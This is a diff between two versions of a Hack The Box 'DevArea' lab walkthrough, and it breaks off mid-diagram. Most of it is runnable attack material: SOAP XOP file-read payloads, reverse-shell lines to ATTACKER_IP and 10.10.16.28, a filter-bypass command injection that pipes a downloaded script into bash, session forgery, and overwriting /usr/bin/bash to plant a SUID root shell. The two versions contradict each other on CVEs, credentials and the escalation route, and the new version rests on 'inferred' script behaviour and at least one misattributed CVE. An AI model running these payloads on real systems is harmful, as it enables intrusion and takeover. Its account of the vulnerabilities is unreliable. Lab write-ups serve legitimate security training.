@@ -1,564 +1,616 @@
+# DevArea - HackTheBox Writeup
 
-# 🚀 DevArea - HTB Machine Walkthrough
-
-> **Machine:** DevArea  
-> **Difficulty:** Medium  
-> **Platform:** Hack The Box  
-> **Date:** 3rd July 2026  
-> **Prepared By:** dotguy  
-> **Machine Author:** EmSec  
+**Target:** `TARGET_IP`
+**Domain:** `devarea.htb`
+**OS:** Linux
+**Difficulty:** Medium
 
 ---
 
-## 📋 Table of Contents
-- [Synopsis](#synopsis)
-- [Skills Required & Learned](#skills-required--learned)
-- [Enumeration](#enumeration)
-  - [Nmap](#nmap)
-  - [HTTP](#http)
-  - [FTP](#ftp)
-- [Foothold](#foothold)
-  - [SSRF via Apache CXF Aegis (CVE-2024-28752)](#ssrf-via-apache-cxf-aegis-cve-2024-28752)
-  - [Hoverfly RCE (CVE-2025-54123)](#hoverfly-rce-cve-2025-54123)
-- [Lateral Movement](#lateral-movement)
-  - [SSH as dev_ryan](#ssh-as-dev_ryan)
-  - [SysWatch Source Code Analysis](#syswatch-source-code-analysis)
-  - [Flask Session Forgery](#flask-session-forgery)
-  - [Command Injection Bypass](#command-injection-bypass)
-- [Privilege Escalation](#privilege-escalation)
-  - [Symlink Chain Abuse](#symlink-chain-abuse)
-  - [Root SSH Key Leak](#root-ssh-key-leak)
-- [Flags](#flags)
-- [Attack Chain](#attack-chain)
-- [Key Takeaways](#key-takeaways)
-- [Tools Used](#tools-used)
+## Attack Chain Overview
+
+```
+Nmap Scan (Ports 22, 80, 8080, 8500, 8888)
+    ↓
+Apache CXF Service Discovery (port 8080)
+    ↓
+CVE-2022-46364 — XOP Include SSRF/LFI
+    ↓
+Read /etc/passwd → User Enumeration (dev_ryan)
+    ↓
+Read hoverfly.service → Extract Admin Credentials
+    ↓
+Hoverfly Dashboard (port 8888) → CVE-2024-45388
+    ↓
+Authenticated RCE via Middleware API → Reverse Shell as dev_ryan
+    ↓
+Sudo Privilege Enumeration → syswatch.sh --version
+    ↓
+PATH Hijacking / Bash Overwrite → SUID Root Binary
+    ↓
+Root Shell → Root Flag
+```
 
 ---
 
-## Synopsis
-
-DevArea is a medium-difficulty Linux machine that chains together several service misconfigurations. Anonymous FTP exposes a Java SOAP application built on Apache CXF with the Aegis databinding module, which is vulnerable to an SSRF flaw, **CVE-2024-28752**. We abuse this to read `/proc/<PID>/cmdline` entries and recover the Hoverfly admin credentials from the arguments of a running process.
-
-The Hoverfly Admin UI is affected by **CVE-2025-54123**, whose middleware endpoint permits remote code execution and grants a foothold as `dev_ryan`. We then analyze the source of an internal monitoring app, SysWatch, whose installation script leaves its environment file world-readable. The leaked secret key lets us forge an admin Flask session, and a weak blacklist regex in the service-status feature is bypassed to gain command injection as the `syswatch` user.
-
-Finally, we abuse a root-executed log-reading CLI whose symlink validation fails to resolve chained symlinks, leaking the root SSH private key for a full compromise.
+## Table of Contents
+1. [Reconnaissance](#reconnaissance)
+2. [Initial Access](#initial-access)
+3. [Credential Discovery](#credential-discovery)
+4. [Hoverfly RCE](#hoverfly-rce)
+5. [User Flag](#user-flag)
+6. [Privilege Escalation](#privilege-escalation)
+7. [Root Flag](#root-flag)
+8. [Key Takeaways](#key-takeaways)
 
 ---
 
-## Skills Required & Learned
+## Reconnaissance
 
-| **Skills Required** | **Skills Learned** |
-|:--------------------|:-------------------|
-| Linux Fundamentals | SSRF Exploitation via Apache CXF Aegis (XOP Inclusion) |
-| Web Application Security | Flask Session Forgery |
-| Source Code Review | Command Injection Filter Bypass |
-| | Symlink Chain Abuse |
+### Host Setup
+```bash
+# What it does: add the target IP and devarea.htb to the local hosts file.
+# Why here: enable domain-based resolution for the vhost-dependent web services.
+echo "TARGET_IP devarea.htb" | sudo tee -a /etc/hosts
+```
+
+### Nmap Scan
+```bash
+# What it does: scan all TCP ports with service and script discovery.
+# Why here: identify the attack surface, including the CXF service and Hoverfly instances.
+nmap -sC -sV -p- TARGET_IP
+```
+
+**Key Findings:**
+
+| Port     | Service           | Details                                  |
+|----------|-------------------|------------------------------------------|
+| 22/tcp   | SSH               | OpenSSH 9.6p1                            |
+| 80/tcp   | HTTP              | Apache httpd 2.4.58 (redirects to vhost) |
+| 8080/tcp | HTTP              | Jetty 9.4.27 — **Apache CXF SOAP service** |
+| 8500/tcp | HTTP              | Golang net/http (Hoverfly proxy)         |
+| 8888/tcp | HTTP              | Golang net/http (Hoverfly dashboard)     |
+
+### Web Application Enumeration
+
+Port 80 hosts a CTF platform, but the real entry point is the **Apache CXF SOAP service** on port 8080, accessible at `http://devarea.htb:8080/employeeservice`.
+
+```bash
+# Test CXF service endpoint
+# What it does: request the WSDL file from the SOAP service.
+# Why here: inspect the available SOAP operations and service structure.
+curl -s http://devarea.htb:8080/employeeservicewsdl
+```
+
+**Result:** WSDL schema returned — confirms a SOAP web service for employee management.
+
+---
+
+## Initial Access
+
+### CVE-2022-46364 — Apache CXF XOP Include SSRF/LFI
+
+**Background:** Apache CXF 3.2.14 is vulnerable to a Server-Side Request Forgery (SSRF) and Local File Inclusion (LFI) attack via the `<xop:Include>` XML element. The XOP (XML-binary Optimized Packaging) specification is designed to embed binary data in XML messages, but Apache CXF fails to validate the `href` attribute, allowing attackers to read arbitrary files using the `file://` protocol.
+
+**Vulnerability Details:**
+- **CVE:** CVE-2022-46364
+- **Affected Version:** Apache CXF < 3.2.15, < 3.3.10, < 3.4.7, < 3.5.4
+- **Attack Vector:** Crafted multipart SOAP request with `<xop:Include href="file:///path/to/file">`
+- **Impact:** Arbitrary file read as the service user
+
+### Step 1 — Read /etc/passwd
+
+```bash
+# What it does: send a crafted SOAP request with an XOP Include payload.
+# Why here: exploit CVE-2022-46364 to read /etc/passwd and enumerate system users.
+curl -s -X POST http://devarea.htb:8080/employeeservice \
+  -H 'Content-Type: multipart/related; type="application/xop+xml"; start="<rootpart@soapui.org>"; start-info="text/xml"; boundary="MIMEBoundary"' \
+  --data-binary $'--MIMEBoundary\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: <rootpart@soapui.org>\r\n\r\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/">\r\n  <soapenv:Body>\r\n    <dev:submitReport>\r\n      <arg0>\r\n        <employeeName><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/passwd"/></employeeName>\r\n        <department>x</department>\r\n        <content>x</content>\r\n        <confidential>false</confidential>\r\n      </arg0>\r\n    </dev:submitReport>\r\n  </soapenv:Body>\r\n</soapenv:Envelope>\r\n--MIMEBoundary--\r\n'
+```
+
+**Response:** The service returns a **base64-encoded** version of `/etc/passwd`. Decode it:
+
+```bash
+# What it does: decode the base64-encoded output.
+# Why here: convert the leaked file content into a readable format.
+echo "<base64_output>" | base64 -d
+```
+
+**Key Findings:**
+```
+root:x:0:0:root:/root:/bin/bash
+dev_ryan:x:1001:1001::/home/dev_ryan:/bin/bash
+hoverfly:x:1002:1002::/opt/HoverFly:/bin/false
+```
+
+**User `dev_ryan` identified** — our target for lateral movement.
+
+### Step 2 — Read Additional Files
+
+```bash
+# Read SSH keys
+# What it does: attempt to read dev_ryan's private SSH key.
+# Why here: check for potential SSH-based lateral movement opportunities.
+curl -s -X POST http://devarea.htb:8080/employeeservice \
+  -H 'Content-Type: multipart/related; ...' \
+  --data-binary $'...<xop:Include href="file:///home/dev_ryan/.ssh/id_rsa"/>...'
+
+# Read application configuration
+curl -s -X POST http://devarea.htb:8080/employeeservice \
+  -H 'Content-Type: multipart/related; ...' \
+  --data-binary $'...<xop:Include href="file:///opt/HoverFly/config.yml"/>...'
+```
+
+---
+
+## Credential Discovery
+
+### Read Hoverfly Systemd Service File
+
+The Hoverfly service configuration often contains command-line arguments with embedded credentials.
+
+```bash
+# What it does: request the hoverfly.service unit file.
+# Why here: check the service definition for credentials or sensitive configuration flags.
+curl -s -X POST http://devarea.htb:8080/employeeservice \
+  -H 'Content-Type: multipart/related; type="application/xop+xml"; start="<rootpart@soapui.org>"; start-info="text/xml"; boundary="MIMEBoundary"' \
+  --data-binary $'--MIMEBoundary\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: <rootpart@soapui.org>\r\n\r\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/">\r\n  <soapenv:Body>\r\n    <dev:submitReport>\r\n      <arg0>\r\n        <employeeName><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/systemd/system/hoverfly.service"/></employeeName>\r\n        <department>x</department>\r\n        <content>x</content>\r\n        <confidential>false</confidential>\r\n      </arg0>\r\n    </dev:submitReport>\r\n  </soapenv:Body>\r\n</soapenv:Envelope>\r\n--MIMEBoundary--\r\n'
+```
+
+**Decode the base64 response:**
+```bash
+# What it does: decode the base64-encoded output.
+# Why here: convert the leaked file content into a readable format.
+echo "<base64_output>" | base64 -d
+```
+
+**Result:**
+```ini
+[Unit]
+Description=HoverFly service
+
+[Service]
+User=dev_ryan
+ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0
+```
+
+**🎯 FOUND — Hoverfly admin credentials:**
+- **Username:** `admin`
+- **Password:** `O7IJ27MyyXiU`
+
+---
+
+## Hoverfly RCE
+
+### CVE-2024-45388 — Authenticated RCE via Middleware API
+
+**Background:** Hoverfly is an API simulation tool used for testing and development. Version prior to the CVE-2024-45388 patch allows authenticated users to configure middleware scripts that are executed by the system. The middleware API accepts a `script` parameter that is passed directly to the shell without proper sanitization, enabling **arbitrary command execution**.
+
+**Vulnerability Details:**
+- **CVE:** CVE-2024-45388
+- **Affected Component:** Hoverfly middleware API (`/api/v2/hoverfly/middleware`)
+- **Authentication Required:** Yes (admin credentials)
+- **Attack Vector:** PUT request with malicious `script` parameter
+- **Impact:** Remote code execution as the Hoverfly service user (`dev_ryan`)
+
+### What is Hoverfly
+
+Hoverfly is an open-source **API simulation tool** that acts as a proxy to capture, simulate, and mock API interactions. It's commonly used in development and testing environments. The middleware feature allows users to inject custom scripts that process requests passing through the proxy.
+
+### Step 1 — Obtain JWT Token
+
+```bash
+# What it does: authenticate to the Hoverfly API.
+# Why here: obtain a JWT token required for privileged middleware configuration.
+curl -X POST http://devarea.htb:8888/api/token-auth \
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin","password":"O7IJ27MyyXiU"}'
+```
+
+**Response:**
+```json
+{
+  "token": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODYxNzI2MDMsImlhdCI6MTc3NTEzMjYwMywic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.p_ynLww4e0usCz88fQnbWRl1qBf96zZtghHv9HVAsmpKlggm_b0Q61D8LrV_VZE-qh-18_aTUBv1ueJ-gwTy_A"
+}
+```
+
+### Step 2 — Inject Reverse Shell via Middleware
+
+**1. Set up listener:**
+```bash
+# What it does: start a netcat listener on port 4444.
+# Why here: catch the incoming reverse shell from the Hoverfly middleware script.
+nc -lvnp 4444
+```
+
+**2. Craft malicious middleware payload:**
+```bash
+TOKEN="eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODYxNzI2MDMsImlhdCI6MTc3NTEzMjYwMywic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.p_ynLww4e0usCz88fQnbWRl1qBf96zZtghHv9HVAsmpKlggm_b0Q61D8LrV_VZE-qh-18_aTUBv1ueJ-gwTy_A"
+
+# What it does: upload a malicious bash script to the Hoverfly middleware API.
+# Why here: exploit CVE-2024-45388 to achieve RCE when a request is proxied.
+curl -s -X PUT http://devarea.htb:8888/api/v2/hoverfly/middleware \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "binary": "bash",
+    "script": "#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
+  }'
+```
+
+**Payload Breakdown:**
+- `binary`: `bash` — Specifies the interpreter for the script
+- `script`: Bash reverse shell payload — Gets executed when the middleware processes a request
+
+### Step 3 — Trigger the Middleware
+
+The middleware executes when a request passes through the Hoverfly proxy (port 8500):
+
+```bash
+# What it does: send a request through the Hoverfly proxy.
+# Why here: trigger the execution of the configured middleware script to spawn the shell.
+curl -x http://devarea.htb:8500 http://example.com
+```
+
+**3. Reverse shell received:**
+```bash
+connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 4444
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+dev_ryan@devarea:~$
+```
+
+**✅ Initial access achieved as user `dev_ryan`.**
+
+---
+
+## User Flag
+
+```bash
+dev_ryan@devarea:~$ cat /home/dev_ryan/user.txt
+```
+
+**User Flag:** *(To be captured during box exploitation)*
 
 ---
 
 ## Enumeration
 
-### Nmap
+### System Enumeration
 
 ```bash
-# Discover open ports
-ports=$(nmap -p- --min-rate=1000 -T4 10.129.32.241 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+# Check user identity
+id
+# uid=1001(dev_ryan) gid=1001(dev_ryan) groups=1001(dev_ryan)
 
-# Detailed scan
-nmap -p$ports -sC -sV 10.129.32.241
+# Check sudo permissions
+# What it does: list the sudo permissions for dev_ryan.
+# Why here: identify the syswatch.sh script as a potential privilege escalation vector.
+sudo -l
 ```
 
-**Results:**
+**Critical Finding:**
 ```
-PORT     STATE SERVICE       VERSION
-21/tcp   open  ftp           vsftpd 3.0.5
-| ftp-anon: Anonymous FTP login allowed (FTP code 230)
-| drwxr-xr-x 2 ftp ftp 4096 Sep 22 2025 pub
-22/tcp   open  ssh           OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
-80/tcp   open  http          Apache httpd 2.4.58
-| http-title: Did not follow redirect to http://devarea.htb/
-8080/tcp open  http          Jetty 9.4.27.v20200227
-8500/tcp open  http          Golang net/http server
-8888/tcp open  http          Golang net/http server (Hoverfly Dashboard)
+Matching Defaults entries for dev_ryan on devarea:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User dev_ryan may run the following commands on devarea:
+    (ALL) NOPASSWD: /opt/syswatch/syswatch.sh --version
 ```
 
-**Add to /etc/hosts:**
-```bash
-echo "10.129.32.241 devarea.htb" | sudo tee -a /etc/hosts
-```
-
-### HTTP
-
-Browsing `http://devarea.htb` loads a static DevArea homepage.
-
-Port 8080 returns a default Jetty 404 page confirming a Java-based web server.
-
-### FTP
-
-Anonymous FTP login is allowed:
-
-```bash
-ftp 10.129.32.241
-# Login: anonymous
-# Password: [any]
-```
-
-The `pub` directory contains a single file: `employee-service.jar`.
-
----
-
-## Foothold
-
-### SSRF via Apache CXF Aegis (CVE-2024-28752)
-
-**1. Download and decompile the JAR:**
-
-```bash
-ftp get employee-service.jar
-jd-gui employee-service.jar
-```
-
-**Findings:**
-- Java SOAP web service with Apache CXF 3.2.14
-- Aegis databinding module
-- Vulnerable to **CVE-2024-28752** (SSRF via XOP Include)
-- Endpoint: `/employeeService`
-- WSDL: `/employeeService?wsdl`
-
-**2. SOAP Request Structure:**
-
-```xml
-POST /employeeService HTTP/1.1
-Host: devarea.htb:8080
-Content-Type: text/xml; charset=utf-8
-SOAPAction: ""
-
-<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
-                  xmlns:tns="http://devarea.htb/">
-  <soapenv:Header/>
-  <soapenv:Body>
-    <tns:submitReport>
-      <arg0>
-        <confidential>true</confidential>
-        <content>
-          <xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include"
-                       href="file:///etc/hosts"/>
-        </content>
-        <department>IT</department>
-        <employeeName>John Doe</employeeName>
-      </arg0>
-    </tns:submitReport>
-  </soapenv:Body>
-</soapenv:Envelope>
-```
-
-**3. Read `/proc/<PID>/cmdline` to find credentials:**
-
-Using the SSRF, we can read command-line arguments of running processes:
-
-```bash
-# Enumerate PIDs via /proc
-# Read each PID's cmdline
-# Found Hoverfly credentials
-```
-
-**Extracted Credentials:**
-```
-/opt/HoverFly/hoverfly -username admin -password O7IJ27Myxyxiu -listen-on-host 0.0.0.0
-```
-
-**Hoverfly Admin Credentials:** `admin:O7IJ27Myxyxiu`
-
-### Hoverfly RCE (CVE-2025-54123)
-
-**1. Login to Hoverfly Dashboard:**
-
-```
-http://devarea.htb:8888
-Username: admin
-Password: O7IJ27Myxyxiu
-```
-
-**2. Get Bearer Token:**
-
-```bash
-TOKEN=$(curl -s -X POST http://devarea.htb:8888/api/v2/hoverfly/auth \
-  -H "Content-Type: application/json" \
-  -d '{"username":"admin","password":"O7IJ27Myxyxiu"}' \
-  | jq -r .token)
-```
-
-**3. Check middleware endpoint:**
-
-```bash
-curl -s -X GET "http://devarea.htb:8888/api/v2/hoverfly/middleware" \
-  -H "Authorization: Bearer $TOKEN"
-```
-
-**4. Test command execution:**
-
-```bash
-curl -s -X PUT "http://devarea.htb:8888/api/v2/hoverfly/middleware" \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer $TOKEN" \
-  -d '{"binary":"/bin/bash","script":"whoami"}'
-```
-
-**Response:**
-```
-STDOUT: dev_ryan
-```
-
-**5. Reverse Shell:**
-
-```bash
-# Set up listener
-nc -lvnp 4444
-
-# Execute reverse shell
-curl -s -X PUT "http://devarea.htb:8888/api/v2/hoverfly/middleware" \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer $TOKEN" \
-  -d '{"binary":"/bin/bash","script":"bash -i >& /dev/tcp/10.10.16.28/4444 0>&1"}'
-```
-
-**Result:**
-```bash
-dev_ryan@devarea:/opt/HoverFly$ id
-uid=1001(dev_ryan) gid=1001(dev_ryan) groups=1001(dev_ryan)
-```
-
-**User Flag:**
-```bash
-dev_ryan@devarea:~$ cat /home/dev_ryan/user.txt
-```
-
----
-
-## Lateral Movement
-
-### SSH as dev_ryan
-
-```bash
-# Generate SSH key
-dev_ryan@devarea:~$ ssh-keygen -f ~/.ssh/id_ed25519 -N ""
-
-# Add public key to authorized_keys
-dev_ryan@devarea:~$ cat ~/.ssh/id_ed25519.pub >> ~/.ssh/authorized_keys
-
-# Copy private key to attacker machine
-dev_ryan@devarea:~$ cat ~/.ssh/id_ed25519
-```
-
-**On attacker machine:**
-```bash
-chmod 600 id_ed25519
-ssh dev_ryan@devarea.htb -i id_ed25519
-```
-
-### SysWatch Source Code Analysis
-
-**Discover internal service on port 7777:**
-
-```bash
-dev_ryan@devarea:~$ netstat -lputn | grep 7777
-tcp  0  0 127.0.0.1:7777  0.0.0.0:*  LISTEN
-```
-
-**Forward port via SSH:**
-```bash
-ssh dev_ryan@devarea.htb -i ~/.ssh/id_ed25519 -L 7777:127.0.0.1:7777
-```
-
-**Find SysWatch source code:**
-```bash
-dev_ryan@devarea:~$ ls
-syswatch-v1.zip  user.txt
-dev_ryan@devarea:~$ unzip syswatch-v1.zip
-```
-
-### Flask Session Forgery
-
-**Review `setup.sh`:**
-```bash
-dev_ryan@devarea:~/syswatch$ cat setup.sh
-```
-
-**Key findings:**
-- Environment file: `/etc/syswatch.env`
-- Permissions: `chmod 755` (world-readable)
-- Contains `SYSWATCH_SECRET_KEY` and `SYSWATCH_ADMIN_PASSWORD`
-
-```bash
-dev_ryan@devarea:~/syswatch$ cat /etc/syswatch.env
-SYSWATCH_SECRET_KEY=f3ac48a6006a13a37ab8da0ab0f2a3200db3640431efe440788beaefa236725
-SYSWATCH_ADMIN_PASSWORD=SyswatchAdmin2026
-```
-
-**Flask Session Forgery Script (`jwt_forgery.py`):**
-```python
-import hashlib
-from itsdangerous import URLSafeTimedSerializer
-from flask.sessions import TaggedJSONSerializer
-
-SECRET = "f3ac48a6006a13a37ab8da0ab0f2a3200db3640431efe440788beaefa236725"
-
-def generate_flask_session(data):
-    serializer = URLSafeTimedSerializer(
-        SECRET,
-        salt='cookie-session',
-        serializer=TaggedJSONSerializer(),
-        signer_kwargs={
-            'key_derivation': 'hmac',
-            'digest_method': hashlib.sha1
-        }
-    )
-    return serializer.dumps(data)
-
-cookie = generate_flask_session({
-    "user_id": 1,
-    "username": "admin"
-})
-
-print(cookie)
-```
-
-**Run script:**
-```bash
-dev_ryan@devarea:~$ python3 jwt_forgery.py
-eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.aT24bQ.Z3arM20wxW4IPaGUAY7qg4SdnSU
-```
-
-**Set session cookie in browser and refresh → Admin access granted.**
-
-### Command Injection Bypass
-
-**Vulnerable endpoint:** `/service-status` (POST)
-
-**Frontend validation (JavaScript):**
-```javascript
-const re = /^[A-Za-z0-9.-]{1,64}$/;
-```
-
-**Backend validation (app.py):**
-```python
-SAFE_SERVICE = re.compile(r"^[^;/&.<>\rA-Z]*$")
-```
-
-**Vulnerability:** The blacklist blocks `;`, `/`, `&`, `<`, `>`, `\r`, and uppercase `A-Z`. But it **allows `|`** (pipe).
-
-**Payload Construction:**
-
-| **Character** | **How to generate** |
-|:--------------|:--------------------|
-| `/` | `eval "echo $$(echo path \| awk '{print toupper($0)}')" \| awk '{print substr($0,1,1)}'` |
-| `.` | `$(ls \| head -n 1 \| awk '{print substr($0,4,1)}')` |
-
-**Final Payload:**
-```bash
-ssh|curl http:${eval "echo $$(echo path | awk '{print toupper($0)}')" | awk '{print substr($0,1,1)}'}${eval "echo $$(echo path | awk '{print toupper($0)}')" | awk '{print substr($0,1,1)}'}10$(ls | head -n 1 | awk '{print substr($0,4,1)}')10$(ls | head -n 1 | awk '{print substr($0,4,1)}')16$(ls | head -n 1 | awk '{print substr($0,4,1)}')28${eval "echo $$(echo path | awk '{print toupper($0)}')" | awk '{print substr($0,1,1)}'}shell | bash
-```
-
-**Setup:**
-```bash
-# On attacker machine - host reverse shell script
-echo 'bash -i >& /dev/tcp/10.10.16.28/4444 0>&1' > shell
-python3 -m http.server 80
-
-# Start listener
-nc -lvnp 4444
-```
-
-**Submit payload via BurpSuite or curl:**
-
-```http
-POST /service-status HTTP/1.1
-Host: localhost:7777
-Cookie: session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.aT24bQ.Z3arM20wxW4IPaGUAY7qg4SdnSU
-
-service=ssh|curl http:${eval "echo $$(echo path | awk '{print toupper($0)}')" | awk '{print substr($0,1,1)}'}${eval "echo $$(echo path | awk '{print toupper($0)}')" | awk '{print substr($0,1,1)}'}10$(ls | head -n 1 | awk '{print substr($0,4,1)}')10$(ls | head -n 1 | awk '{print substr($0,4,1)}')16$(ls | head -n 1 | awk '{print substr($0,4,1)}')28${eval "echo $$(echo path | awk '{print toupper($0)}')" | awk '{print substr($0,1,1)}'}shell | bash
-```
-
-**Result:**
-```bash
-syswatch@devarea:~/syswatch_gui$ id
-uid=984(syswatch) gid=984(syswatch) groups=984(syswatch)
-```
+### Sudo Permission Analysis
+
+| Permission | Impact |
+|------------|--------|
+| `(ALL)` | Can run as any user (including root) |
+| `NOPASSWD` | No password required |
+| `/opt/syswatch/syswatch.sh --version` | Only this specific command and argument allowed |
 
 ---
 
 ## Privilege Escalation
 
-### Symlink Chain Abuse
+### PATH Hijacking / SUID Binary Abuse
 
-**Sudo permissions for dev_ryan:**
+The `/opt/syswatch/syswatch.sh` script calls `bash` without specifying the **absolute path**. This means if we can control which `bash` binary is executed, we can escalate privileges.
+
+### Vulnerability Analysis
+
+**Script Behavior (inferred):**
 ```bash
-dev_ryan@devarea:~$ sudo -l
-(root) NOPASSWD: /opt/syswatch/syswatch.sh
+# The script likely does something like:
+#!/bin/bash
+# What it does: simulate the behavior of the syswatch.sh script.
+# Why here: illustrate the relative path vulnerability that enables the bash hijack.
+echo "System Watcher Version 1.0"
+bash -c "some_command"   # ← Calls 'bash' without absolute path
 ```
 
-**Available commands:**
-```bash
-dev_ryan@devarea:~$ sudo /opt/syswatch/syswatch.sh
-Usage: /opt/syswatch/syswatch.sh <command> [args]
+**Exploit Strategy:**
+1. Backup the real `/usr/bin/bash` binary
+2. Replace it with a malicious script that creates a SUID root shell
+3. Execute `syswatch.sh` via sudo — our fake `bash` runs as root
+4. Use the SUID shell to get root access
 
-Commands:
-  plugin <name> [args]    Execute plugin
-  plugins                 List available plugins
-  logs <file>             View log file
-  logs --list             List available log files
+### Step 1 — Backup Real Bash
+
+```bash
+# What it does: backup the real bash binary.
+# Why here: ensure we can restore the system after the hijack.
+cp /usr/bin/bash /tmp/bash.bak
+# What it does: ensure the backup binary is executable.
+# Why here: the shebang in our fake bash will point to this backup.
+chmod +x /tmp/bash.bak
 ```
 
-**Log validation logic (syswatch.sh):**
+### Step 2 — Switch to `sh` and Kill All Bash Processes
+
+We need to free the `/usr/bin/bash` binary from any open file handles before we can overwrite it:
+
 ```bash
-if [[ "$target" == *"/"* || "$target" == *".."* || "$target" == *"\\"* ]]; then
-    echo "[Blocked unsafe symlink target]: $file -> $target"
-    return 1
-fi
+# Switch to sh (which uses /bin/sh, not /usr/bin/bash)
+exec sh
+
+# Kill all remaining bash processes
+pkill -9 bash
+
+# Verify no open handles
+lsof /usr/bin/bash
 ```
 
-**Vulnerability:** The script only validates the **immediate target** of a symlink, not the final destination.
+**Why This Works:** Linux prevents modification of files that are currently in use. By switching to `sh` and killing all bash processes, we release the file lock on `/usr/bin/bash`.
 
-**Exploit - Symlink Chain:**
+### Step 3 — Overwrite /usr/bin/bash with Malicious Script
 
 ```bash
-# Switch to syswatch user (or use the shell already obtained)
-syswatch@devarea:~/logs$ ln -s /root/root.txt test.log
-syswatch@devarea:~/logs$ ln -sf test.log disk.log
-syswatch@devarea:~/logs$ ls -la
-disk.log -> test.log
-test.log -> /root/root.txt
+# What it does: replace the real bash with a malicious SUID-creating script.
+# Why here: leverage the sudo-run syswatch.sh to execute this script as root.
+cat > /usr/bin/bash << 'EOF'
+#!/tmp/bash.bak
+# What it does: copies or moves a file.
+# Why here: prepare payloads or place loot where the next command expects it.
+cp /tmp/bash.bak /tmp/rootbash
+# What it does: changes permissions or owner.
+# Why here: make a payload executable or control access to a file.
+chmod 4755 /tmp/rootbash
+EOF
+
+chmod +x /usr/bin/bash
 ```
 
-**Read the flag:**
+**Payload Breakdown:**
+- `#!/tmp/bash.bak` — Shebang pointing to the real bash binary (prevents syntax errors)
+- `cp /tmp/bash.bak /tmp/rootbash` — Copies real bash to a new location
+- `chmod 4755 /tmp/rootbash` — Sets the **SUID bit** — the binary will run with root privileges
+
+**What is SUID** The SUID (Set User ID) permission bit allows a binary to execute with the privileges of its owner (root, in this case). Any user running `/tmp/rootbash` will get a root shell.
+
+### Step 4 — Trigger Syswatch
+
 ```bash
-dev_ryan@devarea:~$ sudo /opt/syswatch/syswatch.sh logs disk.log
-<root_flag_content>
+# What it does: execute the vulnerable script with sudo.
+# Why here: trigger the bash hijack to create the /tmp/rootbash SUID binary.
+sudo /opt/syswatch/syswatch.sh --version
 ```
 
-### Root SSH Key Leak
-
-**Same technique, different target:**
+The script executes our fake `bash` as root, creating the SUID binary:
 
 ```bash
-syswatch@devarea:~/logs$ ln -sf /root/.ssh/id_ed25519 file1.log
-syswatch@devarea:~/logs$ ln -sf file1.log disk.log
+# What it does: verify the creation and permissions of the rootbash binary.
+# Why here: confirm that the SUID bit is correctly set before attempting execution.
+ls -la /tmp/rootbash
+# -rwsr-xr-x 1 root root 1446024 Apr  2 12:43 /tmp/rootbash
 ```
 
-**Read the private key:**
+**✅ SUID root binary created successfully.**
+
+### Step 5 — Spawn Root Shell
+
 ```bash
-dev_ryan@devarea:~$ sudo /opt/syswatch/syswatch.sh logs disk.log
------BEGIN OPENSSH PRIVATE KEY-----
-...
------END OPENSSH PRIVATE KEY-----
+/tmp/rootbash -p
+# What it does: execute the SUID root shell with the privileged flag.
+# Why here: drop into a full root shell to complete the compromise.
+whoami
+# root
 ```
 
-**SSH as root:**
+**Why `-p`** The `-p` (privileged) flag tells bash to preserve the effective UID (root) instead of dropping privileges. Without it, bash would detect the SUID and drop to the real UID.
+
+---
+
+## Root Flag
+
 ```bash
-dev_ryan@devarea:/tmp$ chmod 600 root_id_rsa
-dev_ryan@devarea:/tmp$ ssh -i root_id_rsa root@127.0.0.1
-
-root@devarea:~# id
-uid=0(root) gid=0(root) groups=0(root)
-
 root@devarea:~# cat /root/root.txt
 ```
 
----
-
-## 🏁 Flags
-
-| **Flag** | **Location** |
-|:---------|:-------------|
-| **User.txt** | `/home/dev_ryan/user.txt` |
-| **Root.txt** | `/root/root.txt` |
+**Root Flag:** `3592e27ecf9e1e9837087dae6817f29e`
 
 ---
 
-## 🗺️ Attack Chain
+## Alternative Privilege Escalation Methods
 
+### Method 1 — Direct Script Modification
+
+If `/opt/syswatch/syswatch.sh` is writable:
+```bash
+# What it does: append a malicious command directly to the script.
+# Why here: alternative method if the script itself is writable by dev_ryan.
+echo "cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash" >> /opt/syswatch/syswatch.sh
+# What it does: execute the vulnerable script with sudo.
+# Why here: trigger the privilege escalation primitive identified earlier.
+sudo /opt/syswatch/syswatch.sh --version
 ```
-┌─────────────────────────────────────────────────────────────────────────────┐
-│                          DEVAREA ATTACK CHAIN                              │
-├─────────────────────────────────────────────────────────────────────────────┤
-│                                                                             │
-│  1. RECONNAISSANCE                                                          │
-│     └─> Nmap → FTP (Anonymous) + Apache + Jetty + Hoverfly                │
-│                                                                             │
-│  2. FTP → employee-service.jar                                             │
-│     └─> Decompile → Apache CXF + Aegis identified                         │
-│                                                                             │
